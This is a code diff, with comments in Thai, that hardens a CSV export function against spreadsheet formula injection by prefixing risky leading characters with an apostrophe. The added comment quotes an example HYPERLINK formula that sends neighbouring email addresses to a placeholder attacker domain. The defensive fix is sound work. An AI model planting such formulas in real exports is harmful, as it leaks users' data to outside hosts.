@@ -16,9 +16,16 @@ function thTime(ms?: number | null): string {
   }).format(new Date(ms));
 }
 
-/** ครอบค่าที่อาจมี , " \n ให้ปลอดภัยตามสเปก RFC 4180 */
+/**
+ * ครอบค่าที่อาจมี , " \n ให้ปลอดภัยตามสเปก RFC 4180
+ * และกัน **CSV formula injection**: ชื่อผู้ใช้ที่ขึ้นต้นด้วย = + - @ tab หรือ CR
+ * จะถูก Excel/Google Sheets ตีความเป็นสูตรทันทีที่แอดมินเปิดไฟล์
+ * (เช่น ตั้งชื่อเป็น `=HYPERLINK("https://evil.tld?d="&A1,"click")` เพื่อดูดอีเมลข้างเคียงออกไป)
+ * นำหน้าด้วย `'` ให้ตัวแรกไม่ใช่อักขระเริ่มสูตรอีกต่อไป
+ */
 function csvCell(value: string): string {
-  return /[",\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
+  const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+  return /[",\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
 
 /**
